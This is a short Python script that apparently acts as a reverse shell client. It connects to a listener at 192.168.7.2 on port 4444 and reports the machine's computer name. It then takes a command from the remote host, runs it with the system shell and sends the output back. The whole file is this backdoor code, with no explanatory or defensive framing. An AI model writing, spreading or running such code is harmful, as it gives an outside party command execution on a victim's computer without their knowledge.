
import socket, os, subprocess
os.system('cls')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 4444
host = '192.168.7.2'
s.connect((host,port))
s.send((os.environ['COMPUTERNAME']).encode('utf-8'))
rec = s.recv(1024)
if rec == 'quit':
    s.close()
else:
    p = subprocess.Popen(rec.decode('utf-8'),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout_val = p.stdout.read() + p.stderr.read()
    args = stdout_val
    s.send(args)


    

